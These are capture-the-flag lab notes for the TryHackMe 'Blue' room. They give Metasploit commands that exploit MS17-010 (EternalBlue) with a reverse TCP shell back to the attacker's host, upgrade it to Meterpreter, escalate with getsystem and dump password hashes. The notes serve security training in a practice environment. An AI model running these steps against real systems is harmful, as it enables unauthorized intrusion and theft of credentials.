[TryHackMe Blue room](https://tryhackme.com/r/room/blue) | [YouTube Walkthrough](https://www.youtube.com/watch?v=32W6Y8fVFzg)


## setup

1. [Install nmap](https://github.com/TurboLabIt/cybersec/blob/main/notes/000-nmap.md)
2. [Install metasploit](https://github.com/TurboLabIt/cybersec/blob/main/script/metasploit/install.sh)


## recon

[nmap scan, nmap vuln](https://github.com/TurboLabIt/cybersec/blob/main/notes/000-nmap.md)


## exploit info

`msfupdate && msfconsole`

```shell
search ms17-010
info exploit/windows/smb/ms17_010_eternalblue
```


## exploit

```shell
use exploit/windows/smb/ms17_010_eternalblue
show options
set LHOST <my-ip>
set RHOSTS <target-ip>
set payload windows/x64/shell/reverse_tcp
exploit
```


## shell upgrade

```shell
CTRL+Z

use post/multi/manage/shell_to_meterpreter
sessions -l
set SESSION 1
exploit

sessions -l
sessions -i 2

sysinfo
getsystem
hashdump
```
